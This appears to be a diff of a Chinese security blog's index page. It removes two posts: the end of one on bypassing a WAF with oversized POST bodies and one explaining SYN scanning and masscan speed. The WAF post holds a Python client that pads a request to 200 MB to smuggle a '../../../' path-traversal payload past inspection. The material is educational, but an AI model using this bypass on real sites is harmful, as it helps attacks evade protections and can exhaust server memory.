-<p>并且，如果服务是将文件一次性读取到内存中时，那”不怀好意”的人多搞几个这样”post请求体过大”的请求，就有可能导致机器内存耗尽。</p>
-</li>
-<li><p>什么场景下可以使用这种绕过姿势？</p>
-<p>即使waf放行了，也需要后端支持这种超大的请求体。而不少服务对请求体大小是有限制的。</p>
-<p>比如nginx的<a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size">client_max_body_size</a>:如果请求体大小超过此设置值，就会返回 413 (Request Entity Too Large)  错误。 此配置为0表示不限制请求体大小。</p>
-<p>再比如php的<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/ini.core.php#ini.post-max-size">post-max-size</a>:如果请求体大小超过此设置值，<code>$_POST</code>和<code>$_FILES</code>会为空。</p>
-<p><em>所以满足以下条件时，应该可以利用成功</em>:</p>
-<blockquote>
-<p>请求体大小超过waf client_body_buffer_size配置限制，且waf没有处理临时文件</p>
-<p>请求体大小未超过后端服务的大小限制</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="怎么测试"><a href="#怎么测试" class="headerlink" title="怎么测试"></a>怎么测试</h1><p>客户端的测试代码如下，需要看情况调整big_str的大小</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host &#x3D; &quot;a.baidu.com&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:9998&#x2F;a.php&quot;</span><br><span class="line">payload &#x3D; &quot;..&#x2F;..&#x2F;..&#x2F;&quot;</span><br><span class="line">big_str &#x3D; &quot;A&quot;*1024*1024*200  # 200M</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: host, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;</span><br><span class="line">data &#x3D; &quot;a&#x3D;%s&amp;b&#x3D;%s&quot; % (big_str, payload)</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line">print(res.content.decode(&quot;utf8&quot;))</span><br><span class="line">print(res.status_code)</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文并没有研究waf厂商是怎么解决这个问题的，比如pdf提到的stream模式是怎么实现的、stream模式是否可以绕过。</p>
-<p>绕过waf防护的原因是请求体过大时会被存放到”临时文件”中，而不处理”临时文件”是出于io、内存等性能考虑。</p>
-<p>这种绕过姿势还需要”请求体大小未超过后端服务的大小限制”才能利用成功。</p>
-<p>另外 “post请求过大为什么会绕过waf”还有两个可能的原因：</p>
-<blockquote>
-<ul>
-<li>payload刚好被”tcp分片”</li>
-<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jw0vPIvgCdt1090j3-Sxqw">正则回溯次数超过限制</a></li>
-</ul>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">为什么masscan扫描快（一）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某天想到一个常见的安全面试问题：”为什么masscan扫描快？”</p>
-<p>以往我认为是下面三点原因：</p>
-<ul>
-<li>使用syn扫描</li>
-<li>扫描地址随机化</li>
-<li>发包和接受包使用了性能更好的pf_ring包处理框架</li>
-</ul>
-<p>随着最近补了一些网络的基础知识，感觉有点不对劲：</p>
-<ul>
-<li>nmap也支持syn扫描、扫描地址随机化，所以masscan真的是因为这两点比nmap快么？</li>
-<li>nmap用的是啥发包，它为什么不用pf_ring呢？</li>
-<li>pf_ring真的快么？</li>
-</ul>
-<p>这一篇文章主要记录我对syn扫描的学习和做扫描器时遇到的案例。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="什么是syn扫描？"><a href="#什么是syn扫描？" class="headerlink" title="什么是syn扫描？"></a>什么是syn扫描？</h2><p>  也叫半连接扫描，基于sendto系统调用。</p>
-<p>  在syn扫描出现之前，端口扫描大多数基于connect系统调用，因此会完成tcp三次握手。</p>
-<h2 id="为什么要用syn扫描？"><a href="#为什么要用syn扫描？" class="headerlink" title="为什么要用syn扫描？"></a>为什么要用syn扫描？</h2><p>  一般都会说syn有三个好处：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 更隐蔽（相比于connect扫描）</span><br><span class="line">* 更快（相比于connect扫描）</span><br><span class="line">* 比ACK&#x2F;Window&#x2F;Maimon scans等扫描方式（namp的-sA&#x2F;sW&#x2F;sM参数）兼容性好</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li><p>真的更隐蔽么？</p>
-<p>说syn扫描隐蔽的原因是”被扫描主机”和”IDS/IPS”设备 因为没有看到完整的”三次握手”，所以不会记录日志。</p>
-<p>然而现在的防护设备似乎都认识syn扫描，所以已经没有”更隐蔽”这个优势了。</p>
-</li>
-<li><p>为什么比connect扫描快？</p>
-<p>我以前的误区是connect扫描握手需要三个包，而syn扫描是只需要两个包，少发了一个包所以更快。</p>
-<p>实际上更快的原因是：</p>
-<p>当客户端发出去的syn包后收不到响应时（”网络质量不好”或者”扫描目标ip不存在”时会发生）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* connect扫描因为用的是connect系统调用，所以会重传syn包。在linux默认配置时，最多会等待32s才会返回</span><br><span class="line"></span><br><span class="line">* syn扫描因为使用sendto系统调用，它把syn包发出去后就可以立马返回，不会等syn-ack包</span><br></pre></td></tr></table></figure>
-
-<p>一个需要阻塞等待，另一个发送完就返回了，那肯定是发完就返回的快啊。</p>
-<p>看到这里，不知道你会不会质疑我：发完就返回，不等syn-ack包，那syn扫描怎么判断端口是开放的。</p>
-</li>
-</ul>
-<h2 id="syn扫描是怎么判断端口是开放的？"><a href="#syn扫描是怎么判断端口是开放的？" class="headerlink" title="syn扫描是怎么判断端口是开放的？"></a>syn扫描是怎么判断端口是开放的？</h2><p>  虽然sendto系统调用”不等待syn-ack包”，但是当syn-ack包来的时候我们再接着处理就好了。</p>
-<p>  比如当系统接收到一个syn-ack包，我们看一下包是不是从我们扫描对象发过来的，如果是我们就可以从syn-ack包中取出端口信息，认为目标端口是开放的。当然为了防止一些误报，我们还可以做一些检查。</p>
-<p>  所以在syn扫描实现时，我们可以采用两个线程（masscan也是这么实现的）：</p>
-<ul>
-<li>一个线程专门来发syn包</li>
-<li>另一个线程专门来接收syn-ack包，从syn-ack包中判断端口是否开放</li>
-</ul>
-<h2 id="show-me-the-demo"><a href="#show-me-the-demo" class="headerlink" title="show me the demo"></a>show me the demo</h2><p>  网上找的一个demo <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/38642133">简单实现SYN端口扫描</a></p>
-<p>  发送请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sockfd &#x3D; socket(AF_INET,SOCK_RAW,IPPROTO_TCP)  # 使用SOCK_RAW创建原始套接字</span><br><span class="line">..</span><br><span class="line">int ret &#x3D; sendto(sockfd,buffer,sizeof(tcpHeader),0,(struct sockaddr*)&amp;target,sizeof(target)) ;  # 发送syn包后立马返回</span><br></pre></td></tr></table></figure></p>
-<p>  接收请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &#x3D; recvfrom(sockfd,msg,sizeof(msg),0,(struct sockaddr*)&amp;myaddr,&amp;len) ;  &#x2F;&#x2F; 阻塞接收ack包</span><br></pre></td></tr></table></figure></p>
-<h2 id="之前做扫描器实践中遇到的案例"><a href="#之前做扫描器实践中遇到的案例" class="headerlink" title="之前做扫描器实践中遇到的案例"></a>之前做扫描器实践中遇到的案例</h2><p>  端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。</p>
-<p>  估摸着我可能遇到了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a03fb550cf5">DDOS之syn flood 原理及防护</a> 中提到的syn代理。</p>
-<p>  防火墙只要遇到syn包都回syn-ack,这样syn扫描时就会认为端口是开放的。</p>
-<p>  PS：下次再碰到这样的目标详细看看。如果读者有现成的目标案例，欢迎公众号私信给我。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>syn扫描比connect扫描快是因为connect扫描不太受用户程序控制，有可能等待很久。</li>
-<li>syn扫描实现会有两个线程，一个线程负责发syn包，另一个线程负责接收syn-ack包、判断端口开放、回rst包</li>
-</ul>
-<p>另外nmap的文档关于syn扫描和connect扫描都写得很好，值得阅读。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://nmap.org/book/synscan.html#scan-methods-fig-syn-scan-open">nmap官方文档-syn扫描</a></li>
-<li><a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">nmap官方文档-connect扫描</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1455,7 +1465,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
